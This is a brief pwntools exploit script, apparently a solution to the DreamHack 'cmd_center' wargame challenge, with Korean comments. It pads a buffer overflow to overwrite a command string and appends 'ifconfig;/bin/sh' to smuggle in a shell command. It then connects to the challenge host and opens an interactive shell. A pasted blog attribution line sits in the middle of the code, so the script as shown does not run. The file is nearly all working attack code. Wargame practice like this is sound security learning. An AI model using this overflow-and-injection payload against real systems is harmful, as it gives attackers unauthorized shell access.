from pwn import *
#DreamHack cmd_center


#BOF를 통해 cmd_ip의 값을 변조할 수 있으며, command injection을 통해 쉘을 실행시킬 수 있다.
#아래 조건문에서 앞 8byte를 검사하기 때문에 ifconfig;/bin/sh 이런식으로 코드를 페이로드를 짜면 된다.



출처: https://chanin-diary.tistory.com/29 [찬인이의 IT 공부 일기장]
p = remote("host1.dreamhack.games", 10912)
elf = ELF("./cmd_center/cmd_center")


payload = "A" * 24 + "A" * 8
payload += "ifconfig;/bin/sh"

p.send(payload)

p.interactive()
